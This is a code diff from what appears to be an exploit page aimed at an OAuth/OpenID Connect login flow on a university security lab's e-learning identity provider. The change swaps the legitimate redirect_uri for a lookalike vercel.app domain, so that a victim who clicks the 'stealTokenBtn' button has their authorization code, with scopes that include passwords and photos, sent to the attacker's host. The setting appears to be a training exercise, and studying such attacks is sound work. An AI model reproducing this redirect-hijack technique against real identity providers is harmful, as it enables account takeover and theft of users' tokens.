@@ -29,7 +29,7 @@
     // Replace this URL with the EXACT one from the vulnerable flow (spa-v5).
     // Make sure you do NOT remove or alter any required parameters like idp_verifier, sp_verifier, sp_id, etc.
     const authorizeUrl = 
-      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify&state=rPc5JFx7ymOjs0D_RevQNw&code_challenge_method=S256&client_id=spa-1&code_challenge=_oI7V-U9BdKKDAr64rONXJmciwnemM-6SyiRd7ioOaM&response_mode=web_message&idp_verifier=spa-s1"
+      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https%3A%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&state=rPc5JFx7ymOjs0D_RevQNw&code_challenge_method=S256&client_id=spa-1&code_challenge=_oI7V-U9BdKKDAr64rONXJmciwnemM-6SyiRd7ioOaM&response_mode=web_message&idp_verifier=spa-s1"
 
     // When victim clicks the button, open the IdP in a new window.
     document.getElementById("stealTokenBtn").addEventListener("click", () => {
